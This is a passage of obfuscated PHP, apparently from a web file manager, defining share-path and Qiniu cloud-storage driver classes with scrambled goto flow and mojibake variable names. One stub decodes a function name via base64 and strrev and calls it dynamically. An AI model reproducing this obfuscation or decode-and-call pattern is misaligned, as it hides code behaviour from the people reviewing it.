$d˜Å¾ù—©[$B„¯ˆ›ï…[169]] ? $d˜Å¾ù—©[$B„¯ˆ›ï…[169]] : $bç‚Å‰Û®¡; $F‚¼©ë“’ñ = isset($GLOBALS[$B„¯ˆ›ï…[1187]]) ? $GLOBALS[$B„¯ˆ›ï…[1187]] : $f’çí×‰[$B„¯ˆ›ï…[28]]; goto d¥®ÖİãàÒ; EÜ±ƒìÒá: $B„¯ˆ›ï… =& $_SERVER[µ…]; $f’çí×‰ = $this->model->sourceInfo($Fœ™±ª¾Ö); if ($f’çí×‰[$B„¯ˆ›ï…[397]] == $B„¯ˆ›ï…[86]) { header($B„¯ˆ›ï…[1186]); die; } goto bëï–Êçëº; d¥®ÖİãàÒ: if ($aØÀ½á÷) { return IO::fileOutServer($d˜Å¾ù—©[$B„¯ˆ›ï…[75]], $C˜æ¶Ÿ„õò, $F‚¼©ë“’ñ, $bç‚Å‰Û®¡); } IO::fileOut($d˜Å¾ù—©[$B„¯ˆ›ï…[75]], $C˜æ¶Ÿ„õò, $F‚¼©ë“’ñ, $bç‚Å‰Û®¡); goto F´ÅìØ„Ù´; F´ÅìØ„Ù´: } public function fileOut($eªŸ§¶“ê†, $b‰İñ¡‚¨µ = false, $b”Ü¨óˆí = false, $D‹ŒôùÅÌµ = '') { $this->_fileOut($eªŸ§¶“ê†, $b‰İñ¡‚¨µ, $b”Ü¨óˆí, $D‹ŒôùÅÌµ); } public function fileOutServer($A®ãÆ‹ØŒÙ, $e…¿Í¸‘ÇÇ = false, $dØÛ±­ìíª = false, $dØÚÅÎÏŒ = '') { $this->_fileOut($A®ãÆ‹ØŒÙ, $e…¿Í¸‘ÇÇ, $dØÛ±­ìíª, $dØÚÅÎÏŒ, !0); } protected function _fileOutImage($C›×÷™×ã , $B…Ÿù†ôê‹ = 250) { goto eÆ˜‘Á°Ğ©; Cé×•…“àÙ: $F†õ‘µØ‡ = $this->model->fileInfoGet($C›×÷™×ã ); $F†õ‘µØ‡[$C·½£…[28]] = $d³¼£ƒµ—ê[$C·½£…[28]]; $F†õ‘µØ‡[$C·½£…[162]] = $d³¼£ƒµ—ê[$C·½£…[162]]; goto FÖµ¸î¬ñ; FÖµ¸î¬ñ: $GLOBALS[$C·½£…[1187]] = $F†õ‘µØ‡[$C·½£…[28]]; $GLOBALS[$C·½£…[161]] = $F†õ‘µØ‡; IO::fileOutImage($F†õ‘µØ‡[$C·½£…[75]], $B…Ÿù†ôê‹); goto FÖÓéË­É°; eÆ˜‘Á°Ğ©: $C·½£… =& $_SERVER[µ…]; $d³¼£ƒµ—ê = $this->model->pathInfo($C›×÷™×ã ); if ($d³¼£ƒµ—ê[$C·½£…[397]] == $C·½£…[86]) { show_json($C·½£…[1188] . $C›×÷™×ã , !1); } goto Cé×•…“àÙ; FÖÓéË­É°: } public function fileOutImage($Eˆ—¿âã¥ñ, $EÀÃÎŸÛ¡ï = 250) { $this->_fileOutImage($Eˆ—¿âã¥ñ, $EÀÃÎŸÛ¡ï); } public function fileOutImageServer($aëÄº·Œè, $fÄ«°ØÊº· = 250) { $this->_fileOutImage($aëÄº·Œè, $fÄ«°ØÊº·); } public function link($C„ÅÏä‘Î, $CƒíŒòÃœ = '') { $bâÅƒ¦Š‰ñ = $this->model->fileInfoGet($C„ÅÏä‘Î); return IO::link($bâÅƒ¦Š‰ñ[$_SERVER[µ…][75]], $CƒíŒòÃœ); } protected function parse($Fœµ…ŠÀõ) { $d¦İÜ†Œ¯ =& $_SERVER[µ…]; if (strstr($Fœµ…ŠÀõ, $d¦İÜ†Œ¯[8]) === !1) { return array($d¦İÜ†Œ¯[406] => intval($Fœµ…ŠÀõ), $d¦İÜ†Œ¯[75] => $d¦İÜ†Œ¯[33], $d¦İÜ†Œ¯[1182] => array()); } $DæÚ‰ÏÔª = explode($d¦İÜ†Œ¯[8], trim($Fœµ…ŠÀõ, $d¦İÜ†Œ¯[8])); if (count($DæÚ‰ÏÔª) < 2) { show_tips($Fœµ…ŠÀõ . $d¦İÜ†Œ¯[1189]); } return array($d¦İÜ†Œ¯[406] => intval($DæÚ‰ÏÔª[0]), $d¦İÜ†Œ¯[75] => $DæÚ‰ÏÔª[1], $d¦İÜ†Œ¯[1182] => array_slice($DæÚ‰ÏÔª, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($B–­à…²î) { $this->pathParse = $B–­à…²î; $this->model = Model($_SERVER[µ…][1181]); } public function getPathOuter($BÑ˜ÌÏ›òÄ) { $Cé¡ñä¼Å =& $_SERVER[µ…]; if (!$BÑ˜ÌÏ›òÄ) { return $BÑ˜ÌÏ›òÄ; } $Eš¹…æ“Ñ = $this->parse($BÑ˜ÌÏ›òÄ); return trim(KodIO::makeShare($this->pathParse[$Cé¡ñä¼Å[388]], $Eš¹…æ“Ñ[$Cé¡ñä¼Å[388]]), $Cé¡ñä¼Å[8]); } protected function infoParse($fŠ¿½›”£¦, $fÚ½•ÈŒŸ = false, $c”‘ö îè‘ = false) { $b°Í°õÆò =& $_SERVER[µ…]; $D¼‚‰ĞèŠç = $this->pathParse[$b°Í°õÆò[388]]; $FËê±‹é¬‹ = trim($this->pathParse[$b°Í°õÆò[1041]], $b°Í°õÆò[8]); return Action($b°Í°õÆò[1190])->sharePathInfo($D¼‚‰ĞèŠç, $FËê±‹é¬‹); } public function infoFull($b²ô”ÜœÉ) { $CÃÔªÜÓ«÷ =& $_SERVER[µ…]; $AÚˆÊ¦‰–š = explode($CÃÔªÜÓ«÷[8], trim($b²ô”ÜœÉ, $CÃÔªÜÓ«÷[8])); if (count($AÚˆÊ¦‰–š) > 1) { $B‡ïÔ°¡„¨ = implode($CÃÔªÜÓ«÷[8], array_splice($AÚˆÊ¦‰–š, 1)); $cÀˆ¡çÄ = $this->model->pathInfoByPath($AÚˆÊ¦‰–š[0], $B‡ïÔ°¡„¨); if (!$cÀˆ¡çÄ) { return !1; } $this->pathParse[$CÃÔªÜÓ«÷[1041]] = $cÀˆ¡çÄ[$CÃÔªÜÓ«÷[390]]; } return $this->infoParse($b²ô”ÜœÉ); } public function listAll($d…©óÊê¾‡) { goto aÌ’¡èÈ¨Ó; EÏ’ëÄÅ›Î: foreach ($Bâ…ØÂƒ„¼ as &$E¬ôª²°‡ç) { check_abort(); $E¬ôª²°‡ç[$cİÏ•êÎ‘Ù[84]] = $dĞÓĞÕ…æà->_shareItemeParse($E¬ôª²°‡ç[$cİÏ•êÎ‘Ù[84]], $fÇ”­È®); } unset($E¬ôª²°‡ç); return $Bâ…ØÂƒ„¼; goto BÓô„õñ«; fÓÍÇ¸—: $Bâ…ØÂƒ„¼ = $this->model->listAll($d…©óÊê¾‡); $fÇ”­È® = Model($cİÏ•êÎ‘Ù[558])->getInfo($fËê¯ÚÍÛù[$cİÏ•êÎ‘Ù[462]]); $dĞÓĞÕ…æà = Action($cİÏ•êÎ‘Ù[1190]); goto EÏ’ëÄÅ›Î; aÌ’¡èÈ¨Ó: $cİÏ•êÎ‘Ù =& $_SERVER[µ…]; $fËê¯ÚÍÛù = IO::info($this->pathParse[$cİÏ•êÎ‘Ù[75]]); if (!$fËê¯ÚÍÛù) { return array(); } goto fÓÍÇ¸—; BÓô„õñ«: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($aÕ…î¼¼»¢) { $this->pathParse = $aÕ…î¼¼»¢; $this->model = Model($_SERVER[µ…][1181]); } protected function infoParse($CŒ±ø¿Í­, $c©Æˆ³‹ ¼ = false, $eÑ¶•œ¿Û = false) { $BÆÔÉ³ª¿ =& $_SERVER[µ…]; return Action($BÆÔÉ³ª¿[1047])->sharePathInfo($this->pathParse[$BÆÔÉ³ª¿[75]], !0); } public function listPath($AƒÆ…Öò‰ö, $DÀ‹ù—·»† = false) { $c˜“Ñæé° =& $_SERVER[µ…]; $DˆÙŒ¿‹– = parent::listPath($AƒÆ…Öò‰ö, $DÀ‹ù—·»†); foreach ($DˆÙŒ¿‹– as $d‚ôã½ù‡Œ => $B±âºãËÏª) { if (!in_array($d‚ôã½ù‡Œ, array($c˜“Ñæé°[73], $c˜“Ñæé°[74]))) { continue; } foreach ($B±âºãËÏª as $E› °»İƒ => $cÊøÚ»âÎÎ) { $DˆÙŒ¿‹–[$d‚ôã½ù‡Œ][$E› °»İƒ] = Action($c˜“Ñæé°[1047])->shareItemInfo($cÊøÚ»âÎÎ); } } return $DˆÙŒ¿‹–; } public function listAll($AãÆÆ) { goto D¨‡ ¯í¬; D¨‡ ¯í¬: $d©¡Çâ„Ó¤ =& $_SERVER[µ…]; $Bğ ¥œ¦Ü‡ = IO::info($this->pathParse[$d©¡Çâ„Ó¤[75]]); if (!$Bğ ¥œ¦Ü‡) { return array(); } goto AÒÍÂƒ¯â“; cĞª‰¾İîË: return $BõŠ„öµ…; goto F×’ŒíƒÏ; AÒÍÂƒ¯â“: $BõŠ„öµ… = $this->model->listAll($AãÆÆ); foreach ($BõŠ„öµ… as &$EÚé’Äóê¼) { $EÚé’Äóê¼[$d©¡Çâ„Ó¤[84]] = Action($d©¡Çâ„Ó¤[1047])->shareItemInfo($EÚé’Äóê¼[$d©¡Çâ„Ó¤[84]]); } unset($EÚé’Äóê¼); goto cĞª‰¾İîË; F×’ŒíƒÏ: } } goto C»÷‰–ãÍÒ; Dß×Ò÷Âò£: $e‚¡ÁØÈ¹ = strrev(base64_decode($_SERVER[Ïó·ƒ][0])); function binCheckNeq($E£œøôÛŠ, $dÑ”‡ğáˆ) { return $E£œøôÛŠ != $dÑ”‡ğáˆ; } $_SERVER[$_SERVER[Ïó·ƒ][1]] = $e‚¡ÁØÈ¹($_SERVER[$_SERVER[Ïó·ƒ][2]]); goto BêõçÔÈ É; cÔÁå®Ã–ä: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($cô«šêÎ½Š) { parent::__construct(); require_once SDK_DIR . $_SERVER[µ…][1280]; $this->_init($cô«šêÎ½Š); } public function _init($CËòµÙÕµğ) { goto D‡çáŠ¬ß; D‡çáŠ¬ß: $FĞßÈ‚ Ôä =& $_SERVER[µ…]; foreach ($CËòµÙÕµğ as $d¹ö¼Â‹¦‘ => $d©Ê‚ ®Ô) { if (isset($this->{$d¹ö¼Â‹¦‘})) { $this->{$d¹ö¼Â‹¦‘} = $d©Ê‚ ®Ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($FĞßÈ‚ Ôä[1281] . LNG($FĞßÈ‚ Ôä[1240])); } goto F…‡óæøƒë; BÀˆ‰à›ô•: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto Bµˆ´ğë»; F…‡óæøƒë: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto BÀˆ‰à›ô•; Bµˆ´ğë»: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($FˆÃÑº®âÎ, $aíèíö£§ª = '', $Aå³áğÌ = REPEAT_RENAME) { if ($this->setContent($FˆÃÑº®âÎ, $aíèíö£§ª)) { return $this->getPathOuter($FˆÃÑº®âÎ); } return !1; } public function mkdir($E£ÁËåØ, $f‘§—Ÿù¯ = REPEAT_SKIP) { goto b˜•‘åõ·¼; b˜•‘åõ·¼: $C¦‚‡†ÙÉ† =& $_SERVER[µ…]; $d›Ğ†ñ—Ê­ = trim($E£ÁËåØ, $C¦‚‡†ÙÉ†[8]); if ($this->_isFolder($d›Ğ†ñ—Ê­)) { return $this->getPathOuter($d›Ğ†ñ—Ê­); } goto cÏ‹ÔÍµ„; cÏ‹ÔÍµ„: $E£ÁËåØ = $d›Ğ†ñ—Ê­ . $C¦‚‡†ÙÉ†[8]; $e¬—‡÷È½ó = get_path_this($d›Ğ†ñ—Ê­); $D½³‰å¸É‰ = $E£ÁËåØ . $e¬—‡÷È½ó; goto d‹Ç²ÆÊ·†; d‹Ç²ÆÊ·†: if (!$this->mkfile($D½³‰å¸É‰)) { return !1; } if (!$this->moveFile($D½³‰å¸É‰, $E£ÁËåØ)) { $this->delFile($D½³‰å¸É‰); return !1; } return $this->getPathOuter($d›Ğ†ñ—Ê­); goto eç™¸ßŠõ; eç™¸ßŠõ: } public function copyFile($c‹—ÄÚááÌ, $Cñ†¦¤‹Åï) { $cìÏ®ò‡ñƒ = $this->bucketManager->copy($this->bucket, $c‹—ÄÚááÌ, $this->bucket, $Cñ†¦¤‹Åï, !0); return $cìÏ®ò‡ñƒ ? !1 : $this->getPathOuter($Cñ†¦¤‹Åï); } public function moveFile($dšÆ…£óé“, $D÷ò® íÔÉ) { $BŒ£×³á¡ç = $this->bucketManager->move($this->bucket, $dšÆ…£óé“, $this->bucket, $D÷ò® íÔÉ, !0); return $BŒ£×³á¡ç ? !1 : $this->getPathOuter($D÷ò® íÔÉ); } public function delFile($E±ä²”¨¥ˆ) { if (!$this->exist($E±ä²”¨¥ˆ)) { return !0; } $FñÒ×½±É = $this->bucketManager->delete($this->bucket, $E±ä²”¨¥ˆ); return $FñÒ×½±É ? !1 : !0; } public function delFolder($C¾Æã˜İî) { goto eÙ¹·¤İÑÂ; bà²šõ±•›: $C¦Ó¾¹°ƒ = $this->fileList($C¾Æã˜İî); $this->listItemCache = !0; $D§›õğ¯©Ò = trim($C¾Æã˜İî, $fñÓß°§ [8]) . $fñÓß°§ [8]; goto c³ë‹åÉ; eÙ¹·¤İÑÂ: $fñÓß°§  =& $_SERVER[µ…]; if (!$this->exist($C¾Æã˜İî)) { return !0; } $this->listItemCache = !1; goto bà²šõ±•›; B’é°·Éë: return $this->delByBatch($C¦Ó¾¹°ƒ[$fñÓß°§ [74]]); goto EæŠ©ùíÄ¯; c³ë‹åÉ: if (!empty($C¾Æã˜İî) && !in_array($D§›õğ¯©Ò, $C¦Ó¾¹°ƒ[$fñÓß°§ [74]])) { $C¦Ó¾¹°ƒ[$fñÓß°§ [74]][] = $D§›õğ¯©Ò; } $BÒ£òƒĞóº = $this->delByBatch($C¦Ó¾¹°ƒ[$fñÓß°§ [73]]); if (!$BÒ£òƒĞóº) { return !1; } goto B’é°·Éë; EæŠ©ùíÄ¯: } private function delByBatch($AôÃŒ±ëĞá) { foreach (array_chunk($AôÃŒ±ëĞá, 1000) as $fßï ó¼µ£) { $bÔôâ¹Ø = $this->bucketManager->buildBatchDelete($this->bucket, $fßï ó¼µ£); list($AÊéŞÇ‘âô, $Dª›Ú¾ ©–) = $this->bucketManager->batch($bÔôâ¹Ø); if ($Dª›Ú¾ ©–) { return !1; } } return !0; } public function rename($A¶í¦‘Ôàæ, $cĞÁ¾õø£ì) { return $this->renameObject($A¶í¦‘Ôàæ, $cĞÁ¾õø£ì); } public function fileInfo($bìœÑîÃÑ, $FÀÃ·¹÷Œ = false, $d·¤µÆÌÚ¹ = array()) { goto Eæö½àÛ»; Eæö½àÛ»: $a›ŠŸäàÁ =& $_SERVER[µ…]; $fšªìËÍëƒ = array($a›ŠŸäàÁ[28] => $this->pathThis($bìœÑîÃÑ), $a›ŠŸäàÁ[75] => $this->getPathOuter($a›ŠŸäàÁ[8] . $bìœÑîÃÑ), $a›ŠŸäàÁ[29] => $a›ŠŸäàÁ[191], $a›ŠŸäàÁ[77] => isset($d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1282]]) ? $d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1282]] : 0, $a›ŠŸäàÁ[167] => $this->ext($bìœÑîÃÑ)); if ($FÀÃ·¹÷Œ) { return $fšªìËÍëƒ; } goto F›œÙ¡İ«–; aÉéÅƒ¾î¦: if (isset($d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1283]])) { $fšªìËÍëƒ[$a›ŠŸäàÁ[83]] = substr($d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1283]] . $a›ŠŸäàÁ[33], 0, 10); } if (isset($d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1282]])) { $fšªìËÍëƒ[$a›ŠŸäàÁ[77]] = $d·¤µÆÌÚ¹[$a›ŠŸäàÁ[1282]]; } return $fšªìËÍëƒ; goto a©“¤É„ªñ; F›œÙ¡İ«–: $fšªìËÍëƒ[$a›ŠŸäàÁ[192]] = $fšªìËÍëƒ[$a›ŠŸäàÁ[83]] = 0; $fšªìËÍëƒ[$a›ŠŸäàÁ[193]] = $fšªìËÍëƒ[$a›ŠŸäàÁ[194]] = !0; if (empty($d·¤µÆÌÚ¹)) { $d·¤µÆÌÚ¹ = $this->objectMeta($bìœÑîÃÑ); if (!$d·¤µÆÌÚ¹) { return $fšªìËÍëƒ; } } goto aÉéÅƒ¾î¦; a©“¤É„ªñ: } public function folderInfo($C¦İãŠÚÓ, $f—Ù¼éç½« = false) { goto c½Å—„è¢´; D­ãŠ˜óÄ‚: $Fë¦ï¶à“â[$A¹ˆÈŠŞÖÌ[192]] = $Fë¦ï¶à“â[$A¹ˆÈŠŞÖÌ[83]] = 0; $Fë¦ï¶à“â[$A¹ˆÈŠŞÖÌ[193]] = $Fë¦ï¶à“â[$A¹ˆÈŠŞÖÌ[194]] = !0; $C¦İãŠÚÓ = rtrim($C¦İãŠÚÓ, $A¹ˆÈŠŞÖÌ[8]) . $A¹ˆÈŠŞÖÌ[8]; goto c§êÏÖ‹ßš; c§êÏÖ‹ßš: $A˜œóÚ¢Øõ = $this->objectMeta($C¦İãŠÚÓ); if (isset($A˜œóÚ¢Øõ[$A¹ˆÈŠŞÖÌ[1283]])) { $Fë¦ï¶à“â[$A¹ˆÈŠŞÖÌ[83]] = substr($A˜œóÚ¢Øõ[$A¹ˆÈŠŞÖÌ[1283]] . $A¹ˆÈŠŞÖÌ[33], 0, 10); } return $Fë¦ï¶à“â; goto dæ·ß¥à‘ë; c½Å—„è¢´: $A¹ˆÈŠŞÖÌ =& $_SERVER[µ…]; $Fë¦ï¶à“â = array($A¹ˆÈŠŞÖÌ[28] => $this->pathThis($C¦İãŠÚÓ), $A¹ˆÈŠŞÖÌ[75] => $this->getPathOuter($A¹ˆÈŠŞÖÌ[8] . $C¦İãŠÚÓ), $A¹ˆÈŠŞÖÌ[29] => $A¹ˆÈŠŞÖÌ[76]); if ($f—Ù¼éç½«) { return $Fë¦ï¶à“â; } goto D­ãŠ˜óÄ‚; dæ·ß¥à‘ë: } public function listPath($c­ïíêîé, $f£Á½ÆöŠ™ = false) { $aÁ¨²í·´Á =& $_SERVER[µ…]; $BË£Ñ«³äŒ = $this->fileList($c­ïíêîé, $aÁ¨²í·´Á[8], !0); foreach ($BË£Ñ«³äŒ[$aÁ¨²í·´Á[74]] as $BÀ©õæ«š  => $fÎˆ‚¿¯„) { $BË£Ñ«³äŒ[$aÁ¨²í·´Á[74]][$BÀ©õæ«š ] = $this->folderInfo($fÎˆ‚¿¯„, $f£Á½ÆöŠ™); } foreach ($BË£Ñ«³äŒ[$aÁ¨²í·´Á[73]] as $BÀ©õæ«š  => $fÎˆ‚¿¯„) { $BË£Ñ«³äŒ[$aÁ¨²í·´Á[73]][$BÀ©õæ«š ] = $this->fileInfo($fÎˆ‚¿¯„[$aÁ¨²í·´Á[92]], $f£Á½ÆöŠ™, $fÎˆ‚¿¯„); } return $BË£Ñ«³äŒ; } public function has($BéĞÀÌœÛ, $bÜ¹˜‰ÁŞ‹ = false, $B³”×äê…£ = true) { goto Fôæß‹Ä»Ó; bÜÓí½ƒ¬Ì: $EÊŠ«¾Ğ•Ç = $Dù…ßä‚Ğ = 0; while (!0) { check_abort(); list($Bƒ·‹óÙ¦á, $b®—‚×ëÏ) = $this->bucketManager->listFiles($this->bucket, $b¯¶—¥Ò±Ä, $C‹ñÇ˜¿˜, $EÅ øéÁ•, $a¾¹ˆ”Ú‘±); if ($b®—‚×ëÏ) { break; } $C‹ñÇ˜¿˜ = array_key_exists($eƒÂåÇãÌ[1252], $Bƒ·‹óÙ¦á) ? $C‹ñÇ˜¿˜ = $Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1284]] : $eƒÂåÇãÌ[33]; if ($bÜ¹˜‰ÁŞ‹) { if (!empty($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1285]])) { $EÊŠ«¾Ğ•Ç += count($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1285]]); } if (!empty($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1286]])) { $Dù…ßä‚Ğ += count($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1286]]); } if ($C‹ñÇ˜¿˜ === $eƒÂåÇãÌ[33]) { break; } continue; } if ($B³”×äê…£) { if (!empty($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1285]])) { return !0; } } else { if (!empty($Bƒ·‹óÙ¦á[$eƒÂåÇãÌ[1286]])) { return !0; } } if ($C‹ñÇ˜¿˜ === $eƒÂåÇãÌ[33]) { break; } } if ($bÜ¹˜‰ÁŞ‹) { return array($eƒÂåÇãÌ[201] => $EÊŠ«¾Ğ•Ç, $eƒÂåÇãÌ[202] => $Dù…ßä‚Ğ); } goto e’Å‰‘İª¹; e’Å‰‘İª¹: return !1; goto C¿•ˆÔËæ; DêĞ‚ÂãèÊ: $C‹ñÇ˜¿˜ = $eƒÂåÇãÌ[33]; $EÅ øéÁ• = 500; $a¾¹ˆ”Ú‘± = $eƒÂåÇãÌ[8]; goto bÜÓí½ƒ¬Ì; Fôæß‹Ä»Ó: $eƒÂåÇãÌ =& $_SERVER[µ…]; $BéĞÀÌœÛ = trim($BéĞÀÌœÛ, $eƒÂåÇãÌ[8]); $b¯¶—¥Ò±Ä = empty($BéĞÀÌœÛ) ? $eƒÂåÇãÌ[33] : $BéĞÀÌœÛ . $eƒÂåÇãÌ[8]; goto DêĞ‚ÂãèÊ; C¿•ˆÔËæ: } public function listAll($CÄôÑ•Ö®–) { $EÀÒìøöËø =& $_SERVER[µ…]; $cÈ´Æ­†âÇ = $this->fileList($CÄôÑ•Ö®–, $EÀÒìøöËø[33], !0); $c¶ì²à¦ÚØ = array(); foreach ($cÈ´Æ­†âÇ[$EÀÒìøöËø[73]] as $f¯„¶™’) { $c¶ì²à¦ÚØ[$f¯„¶™’[$EÀÒìøöËø[92]]] = $f¯„¶™’[$EÀÒìøöËø[77]]; } foreach ($cÈ´Æ­†âÇ[$EÀÒìøöËø[74]] as $f¯„¶™’) { if (is_string($f¯„¶™’)) { $c¶ì²à¦ÚØ[$f¯„¶™’] = 0; } } return $this->listAllFiles($CÄôÑ•Ö®–, array_keys($c¶ì²à¦ÚØ), $c¶ì²à¦ÚØ); } private function fileList($Eğâ™Å– Ç, $c‹ñá‡Ç· = '', $BùšŠÏ‘¨œ = 0) { goto cÂ¾æØ­‚Ú; cÂ¾æØ­‚Ú: $f‡‚æĞõŒ =& $_SERVER[µ…]; $Eğâ™Å– Ç = trim($Eğâ™Å– Ç, $f‡‚æĞõŒ[8]); $c•©±´ÌŞ = empty($Eğâ™Å– Ç) ? $f‡‚æĞõŒ[33] : $Eğâ™Å– Ç . $f‡‚æĞõŒ[8]; goto e•Ï¢õÜ; e•Ï¢õÜ: $D´ôÁ‘¡‡’ = $f‡‚æĞõŒ[33]; $e™ˆóĞÔ¦Ú = 1000; $aÍÈÙ¸ë = $this->listItemCache === !1 ? !1 : !0; goto AÆŒ…â–Ì¬; f­—–Ú¥‡: return array($f‡‚æĞõŒ[74] => $FŠ¥ÇÓÆ Ü, $f‡‚æĞõŒ[73] => $dÏÁö®ù°Ğ); goto a½ª¢Ãš‡£; AÆŒ…â–Ì¬: $FŠ¥ÇÓÆ Ü = $dÏÁö®ù°Ğ = array(); while (!0) { check_abort(); list($eäõ‘İÛÂ , $fèªÄÀÎØ) = $this->bucketManager->listFiles($this->bucket, $c•©±´ÌŞ, $D´ôÁ‘¡‡’, $e™ˆóĞÔ¦Ú, $c‹ñá‡Ç·); if ($fèªÄÀÎØ) { break; } $D´ôÁ‘¡‡’ = array_key_exists($f‡‚æĞõŒ[1252], $eäõ‘İÛÂ ) ? $D´ôÁ‘¡‡’ = $eäõ‘İÛÂ [$f‡‚æĞõŒ[1284]] : $f‡‚æĞõŒ[33]; $cà·Øì‚î = isset($eäõ‘İÛÂ [$f‡‚æĞõŒ[1285]]) ? $eäõ‘İÛÂ [$f‡‚æĞõŒ[1285]] : array(); $FåÆë¤—†§ = isset($eäõ‘İÛÂ [$f‡‚æĞõŒ[1286]]) ? $eäõ‘İÛÂ [$f‡‚æĞõŒ[1286]] : array(); foreach ($cà·Øì‚î as $aâà—áâ£) { goto f®¶š©™£Œ; d°÷«ÖÁê: if ($bÛ»À‹«è) { $FŠ¥ÇÓÆ Ü[] = $CÉ¹­¶Õ; continue; } $dÏÁö®ù°Ğ[] = $BùšŠÏ‘¨œ ? $aâà—áâ£ : $CÉ¹­¶Õ; goto Cô±¥½ÊÅ°; Bºˆ­àÀÜº: $aâà—áâ£[$f‡‚æĞõŒ[77]] = $FÉ¼š«·Òµ; $bÛ»À‹«è = $FÉ¼š«·Òµ == 0 && substr($CÉ¹­¶Õ, strlen($CÉ¹­¶Õ) - 1, 1) == $f‡‚æĞõŒ[8] ? !0 : !1; if ($aÍÈÙ¸ë) { $this->cacheMethod($f‡‚æĞõŒ[197], $CÉ¹­¶Õ, $bÛ»À‹«è); $this->cacheMethod($f‡‚æĞõŒ[198], $CÉ¹­¶Õ, $aâà—áâ£); } goto d°÷«ÖÁê; f®¶š©™£Œ: if ($aâà—áâ£[$f‡‚æĞõŒ[92]] == $c•©±´ÌŞ) { continue; } $CÉ¹­¶Õ = $aâà—áâ£[$f‡‚æĞõŒ[92]]; $FÉ¼š«·Òµ = $aâà—áâ£[$f‡‚æĞõŒ[1282]]; goto Bºˆ­àÀÜº; Cô±¥½ÊÅ°: } foreach ($FåÆë¤—†§ as $CÉ¹­¶Õ) { if ($CÉ¹­¶Õ == $c•©±´ÌŞ) { continue; } $FŠ¥ÇÓÆ Ü[] = $CÉ¹­¶Õ; if ($aÍÈÙ¸ë) { $this->cacheMethod($f‡‚æĞõŒ[197], $CÉ¹­¶Õ, !0); } } if ($D´ôÁ‘¡‡’ === $f‡‚æĞõŒ[33]) { break; } } if ($aÍÈÙ¸ë) { $this->cacheMethod($f‡‚æĞõŒ[197], $Eğâ™Å– Ç, !0); } goto f­—–Ú¥‡; a½ª¢Ãš‡£: } public function canRead($d…øĞÖç¼Ç) { return $this->exist($d…øĞÖç¼Ç) ? !0 : !1; } public function canWrite($E§ç•á™²£) { return $this->exist($E§ç•á™²£) ? !0 : !1; } public function getContent($Bˆ¶ë±ç¬‹) { return $this->fileSubstr($Bˆ¶ë±ç¬‹, 0, -1); } public function setContent($B‡îĞ©æ Ù, $D¶ä…›ƒ = '') { $c•­ùØÊİÂ = $this->tempFile($this->pathThis($B‡îĞ©æ Ù)); file_put_contents($c•­ùØÊİÂ, $D¶ä…›ƒ); if ($this->upload($B‡îĞ©æ Ù, $c•­ùØÊİÂ)) { $this->tempFileRemve($c•­ùØÊİÂ); return !0; } return !1; } public function refreshUrls($cóœ°‚ó‹·) { goto aÑòø´¡­; f°¬ËÌˆö: return $C¡÷åÓˆŞæ[$Dâ• èñä²[1055]] == $Dâ• èñä²[711] ? !0 : !1; goto Fš¶ñ´Çï¹; aÑòø´¡­: $Dâ• èñä² =& $_SERVER[µ…]; $D¬–×–³Ş‘ = array(); if (is_array($cóœ°‚ó‹·)) { foreach ($cóœ°‚ó‹· as $aåóâƒæ“¥) { $D¬–×–³Ş‘[] = $this->link($aåóâƒæ“¥); } } else { $D¬–×–³Ş‘[] = $this->link($cóœ°‚ó‹·); } goto E†¦‰—…; E†¦‰—…: $AÆ¼ŠÊ£ªĞ = new Qiniu\Cdn\CdnManager($this->auth); list($C¡÷åÓˆŞæ, $c“¿‚œæšâ) = $AÆ¼ŠÊ£ªĞ->refreshUrls($D¬–×–³Ş‘); if ($c“¿‚œæšâ) { return !1; } goto f°¬ËÌˆö; Fš¶ñ´Çï¹: } public function fileSubstr($fÒ¹Û•«Œ©, $d‹ìÃ ©Öİ, $B™¸ƒßÒ‡Õ) { $dºÏ©‹¦™‹ =& $_SERVER[µ…]; if (!($EªÄ‚ŸäËÉ = $this->link($fÒ¹Û•«Œ©))) { return !1; } $bÅ³›‚Ğã = !1; if ($B™¸ƒßÒ‡Õ > 0) { $F¾ÍòÌ²ñö = $d‹ìÃ ©Öİ + $B™¸ƒßÒ‡Õ - 1; $bÅ³›‚Ğã = array($dºÏ©‹¦™‹[1287] . $d‹ìÃ ©Öİ . $dºÏ©‹¦™‹[434] . $F¾ÍòÌ²ñö); } $eâîÅ“Ôøó = url_request($EªÄ‚ŸäËÉ, $dºÏ©‹¦™‹[226], !1, $bÅ³›‚Ğã); return $eâîÅ“Ôøó[$dºÏ©‹¦™‹[704]] ? $eâîÅ“Ôøó[$dºÏ©‹¦™‹[1065]] : !1; } public function upload($f£ßØÙÓŞß, $bô¨êˆ¢À‡, $bĞ–Œõ‘®— = false, $Bì­Ÿ‹©Ôâ = REPEAT_REPLACE) { $B®ßø¦Øñ» = new Qiniu\Storage\UploadManager(); $AÍáÃ‘÷£ = $this->auth->uploadToken($this->bucket, $f£ßØÙÓŞß); $A…­¿õ´ùœ = get_file_mime(get_path_ext($bô¨êˆ¢À‡)); list($C“¸Î¸‰É‚, $EÎÅ¹Á×‡) = $B®ßø¦Øñ»->putFile($AÍáÃ‘÷£, $f£ßØÙÓŞß, $bô¨êˆ¢À‡, null, $A…­¿õ´ùœ); return $EÎÅ¹Á×‡ ? !1 : $this->getPathOuter($f£ßØÙÓŞß); 